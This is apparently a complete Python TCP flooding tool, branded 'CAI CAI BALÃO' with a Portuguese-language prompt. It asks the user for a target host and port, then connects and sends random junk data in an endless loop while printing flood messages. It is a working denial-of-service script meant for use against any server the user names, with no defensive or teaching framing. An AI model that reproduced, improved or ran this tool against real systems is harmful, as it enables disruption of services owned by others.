import socket
import random
import sys

print('''\r\n
   ******      **     **     ******      **     **
  **////**    ****   /**    **////**    ****   /**
 **    //    **//**  /**   **    //    **//**  /**
/**         **  //** /**  /**         **  //** /**
/**        **********/**  /**        **********/**
//**    **/**//////**/**  //**    **/**//////**/**
 //****** /**     /**/**   //****** /**     /**/**
  //////  //      // //     //////  //      // // 

┌─────────────────────────────────────────────────────┐
│ version 1.0.0                                       │
│                                                     │
│                [!!!CAI CAI BALÃO!!!]                │                      
│                                                     │
│                              Code By Julio Carneiro │
├─────────────────────────────────────────────────────┤
│      Github: https://github.com/juliocarneiro	      │
└─────────────────────────────────────────────────────┘\r\n''')


def main():
    global port
    global target

    target = str(input("Digite o alvo: "))
    if target == "":
        print("Digite algum valor e tente novamente!")
        exit()
    else:
        target = str(target)
    if target != "":
        print("Alvo selecionado!")

    port = str(input("Porta (HTTPS=443): "))
    if port == "":
        port = 80
        print("Porta 80 selecionada")
    else:
        port = int(port)
    if port == 443:
        print("Porta 443 selecionada")

    adr = (target, port)
    data = "qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"

    while True:
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.connect(adr)

        Bytes = (data*random.randrange(16, 64))
        BytesEnc = str.encode(Bytes)
        Sock.sendall(BytesEnc)

        print('Flooding {0} in port {1} with {2} bytes of data'.format(
            target, port, sys.getsizeof(BytesEnc)))
        if socket.error:
            Sock.shutdown(socket.SHUT_RDWR)
            Sock.close
            del Sock


main()
